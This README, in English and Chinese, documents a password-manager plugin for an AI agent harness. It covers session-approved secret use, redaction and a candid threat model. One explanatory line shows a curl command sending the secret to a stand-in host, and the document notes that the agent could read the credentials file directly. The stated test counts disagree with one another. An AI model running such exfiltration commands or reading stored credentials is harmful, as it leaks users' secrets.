# dsh-secret

English | 中文见下方

A password manager for **DeepSeek Harness**: keep credentials in the harness store, manage them from **Settings → 密码管理** (or a CLI), and let the agent *use* one by name after a **once-per-session approval** — read as an environment variable. The plaintext never enters the conversation.

## Install

```sh
# from GitHub — no build step, lib/ is committed
dsh plugin --profile web add github:Wu-Z/dsh-secret

# or from a local checkout
dsh plugin --profile web add link:/path/to/dsh-secret
```

Restart `dsh web` once afterwards, then open **Settings**. Requires dsh web **0.1.6-alpha.1** or newer (`engines.dsh`) and Node ≥ 20. MIT.

## What it does

| Surface | Driven by | What it does |
|---|---|---|
| **UI** — Settings → 「密码管理」 | you, in the Web GUI | list / add / rename / edit the Chinese label / delete. Value inputs are write-only. |
| **CLI** — `cli.mjs` | you, in a terminal | `list` / `set` / `del`, with hidden input. |
| **Agent tools** — `secret_list`, `secret_run` | the agent, in a session | asks for a **once-per-session** approval, then runs one command with the secret in its environment, redacting the value from the output. |

There is no read-back path: no surface can display a stored value.

## Security model

- Values live in the harness credential store (`$DSH_HOME/.credentials.yaml`); this plugin writes only through the host-side credential seam.
- The browser never receives a value — the panel's Remote namespace answers `{name, configured, source, writable, note}` only.
- `secret_run` injects the value as `$DSH_SECRET` and as the credential's own name, and replaces every occurrence in stdout/stderr before returning. Never put it in argv: `ps` sees argv.
- Renaming happens host-side (read → write → delete), so a rename cannot expose the plaintext either.
- Commands execute through the harness shell service and inherit the session's sandbox policy.
- The injected stylesheet targets only this plugin's own Settings section: it contains no selector for harness chrome, so loading or removing the plugin cannot disturb the rest of the UI.

## Development

```sh
npm install
npm run build     # esbuild → lib/index.js, lib/typert.host.js, lib/client.js
npm test          # 41 host checks + 22 render checks
```

`DSH_TOOLS_LIB=/path/to/deepseek-harness/packages/core/tools/lib/index.js` additionally enables the check that this plugin's tool schemas pass the harness's own JSON-Schema validator.

---

**以下为中文文档。**

密码存起来，在会话里**按名字申请使用**，明文不进对话。

三块，功能都很小：

| 块 | 谁驱动 | 做什么 |
|---|---|---|
| **界面**（设置页「密码管理」） | 你，在 Web GUI 里 | 列出 / 新增 / 改名 / 改描述 / 删除。输入框只写，值永不回显。 |
| **CLI**（`cli.mjs`） | 你，在自己的终端 | 同一件事的终端版本：`list` / `set` / `del`，隐藏输入。 |
| **工具**（`secret_list` / `secret_run`） | agent，在会话里 | 列名字；**每会话申请一次**，你确认后它按 `$变量` 使用密码。 |

界面与 CLI 都只写不读：没有任何回读路径能返回已存的值。

## 1 · 界面（设置页里的「密码管理」）

装好后打开 **设置**，左侧导航多出一项「密码管理」（`settings.section` 槽位，与仓库内 `ui-settings-unarchive-sessions` 用的是同一契约）。这一节里是：

- **列表**：每行显示凭据的**中文说明**（英文变量名做悬浮提示）+ 状态徽标：`已配置` / `只读（被环境遮蔽）` / `未配置`
- **新增**：变量名 + 中文描述 + 值 —— 三项各占一行
- **修改**：变量名 + 中文描述 + 新值（**新值留空**表示只改名字/描述，已存的值不动）
- **删除**：直接从存储里移除

中文描述存在旁挂文件 `$DSH_HOME/.credentials-notes.yaml`（可手改，格式是 `notes:` 下一行一条）。没写描述时按名字推导（`JEV_API_KEY` → 「JEV 的 API 密钥」），认不出来就不编造，列表退回显示英文名。

值经宿主侧的凭据 seam 写入 `$DSH_HOME/.credentials.yaml`，页面只收到 `{name, configured, source, writable, note}`；**改名由宿主侧完成**（读旧值 → 写新名 → 删旧名 → 搬描述），明文依旧不经过浏览器。

本插件的样式表**只作用于自己这一节**，不含任何针对 harness 自身（侧栏、布局）的选择器 —— 装载或移除它都不会扰动别的界面。

## 2 · CLI（同样的管理能力，终端里）

```sh
cd /path/to/dsh-secret

node cli.mjs list                          # 列出已存的凭据名
node cli.mjs set VPS_ROOT_PASSWORD         # 新增或修改（隐藏输入，不回显）
node cli.mjs del VPS_ROOT_PASSWORD         # 删除
printf '%s' "$PW" | node cli.mjs set NAME --stdin   # 管道用法
```

行级定向修改（注释、键序、未触碰条目的格式都保留）、原子写、强制 `0600`、含换行的值拒绝、不认识顶层内容时拒绝改写。**故意没有 `get`**：打印到终端等于送进 scrollback 与 history。

## 3 · 会话里怎么用（每会话申请一次）

> 用我的 VPS 密码看一下磁盘占用

agent 先 `secret_list` 认名字，再 `secret_run({ ref: "VPS_ROOT_PASSWORD", command: "..." })`。**该会话第一次调用**会弹审批，你确认后：

- 值注入子进程环境，命令里按变量读 —— `$DSH_SECRET`，或凭据自己的名字 `$VPS_ROOT_PASSWORD`
- 输出里每一处该值替换成 `«已屏蔽»`
- **同一会话后续调用不再询问**（审批是每会话一次，不是每次）

```sh
# 目标工具要求特定变量名时，内联赋值（值不进 argv）
SSHPASS="$DSH_SECRET" sshpass -e ssh root@host uptime
PGPASSWORD="$DSH_SECRET" psql -h db -U app

# ✗ 别把变量放进 argv —— ps 能看到
sshpass -p "$VPS_ROOT_PASSWORD" ssh …
```

`secret_list` 不受审批约束（它永远不回值）。没有会话标识的调用（理论上）每次都问。

**fail-closed 提醒**：审批请求只在审批服务返回 `allowed-once` 时放行，所以在没有审批通道的组合里 `secret_run` 会变成**直接拒绝**，不会悄悄执行。本机 Web profile 有审批通道。

## 构建

界面那一半是浏览器产物，必须先构建（已构建过，改前端后要重跑）：

```sh
cd /path/to/dsh-secret
npm run build          # → lib/index.js, lib/typert.host.js, lib/client.js
```

`zod` 只在宿主侧保持 external（profile 旁解析得到）；`react` / `react-dom` 由浏览器运行时提供。**没有 codegen**：Remote 契约是手写的 Typert manifest（`src/host/typert.js`），这正是不必把包放进 dsh 仓库的原因。

## 安装（你自己执行）

```sh
dsh plugin --profile web add "link:/path/to/dsh-secret"
```

装完**重启 dsh host**（宿主半侧插件 + 新的 Remote 命名空间）。包内 `cordis.patch.yml` 自带 loader entry。

### 可选配置

```yaml
- insert:
    - id: secret
      name: 'dsh-secret'
      config:
        path: /absolute/store.yaml     # 仅当 provider 的 path 被改过
        approval: never                # 关掉每会话申请（默认 always）
        allow: [VPS_ROOT_PASSWORD]     # 只允许这些名字，其余拒绝
```

| 字段 | 默认 | 说明 |
|---|---|---|
| `path` | `$DSH_HOME/.credentials.yaml` | 凭据存储文档路径 |
| `approval` | `always` | `never` 才关掉每会话申请 |
| `allow` | `[]`（全允许） | 允许使用的凭据名白名单 |

`allow` 是**真边界**（名单外的名字到不了凭据 seam）。**故意不做 argv 白名单**：`sshpass -e ssh host` 后面接 `; curl -d "$DSH_SECRET" evil.example` 照样过，那会是个看着像防线、实际拦不住的东西。

## 边界（请如实理解）

- **脱敏保护的是转录，不是网络。** `secret_run` 本质是「用你的密码执行任意命令」：命令可以把值发到别处，而且不经过输出、连脱敏都不触发。每会话一次的审批是这里唯一的真实约束。
- **agent 与你是同一个 OS 用户。** 它能自己 `cat ~/.dsh/.credentials.yaml`；本插件不改变这一点，只是给了一条不必那么做的正路。
- **短于 4 个字符的值不脱敏**，这类值本身也不该当密码用。
- **界面只列存储里的名字。** 值来自启动环境或 `.env`、名字不在存储文件里的引用无法被发现（ref 半边没有枚举接口），因此不会出现在列表里。
- 只读条目（值来自启动环境、被遮蔽）能被列出，但写入会被 seam 拒绝，`secret_run` 用的是遮蔽层的值 —— 与 dsh 里其他消费方一致。
- CLI 的隐藏输入需要真 TTY；非交互环境请用 `--stdin`。

## 自检

```sh
npm test        # = node test.mjs && node scripts/render-test.mjs
```

**51 项**，不需要 harness、不需要浏览器、不需要 TTY：

- `test.mjs`（33 项）—— YAML 键名扫描、脱敏、配置归一、两个工具的形状与输出 schema 一致、双重变量注入、**每会话审批**（首次问、执行后放行、别的会话要重问、无会话始终问）、名字白名单、文档编辑全套、CLI 端到端（真起子进程、验文件内容与 `0600`）、Remote 服务（`list`/`set`/`remove` + 参数校验 + `typertRemote` 形状）
- `scripts/render-test.mjs`（22 项）—— 加载**构建产物** `lib/client.js`，桩掉 React hooks 后服务端渲染真实组件：注册进 `settings.section`、五种状态（列表/加载/空/报错/行内编辑）、格式（按列）、徽标、`type="password"`、**渲染结果里绝不出现任何值**，以及**样式表不得命中 harness chrome**

CLI 的隐藏输入分支没有自动化覆盖（需要真 TTY），装完请手动试一次 `node cli.mjs set`。
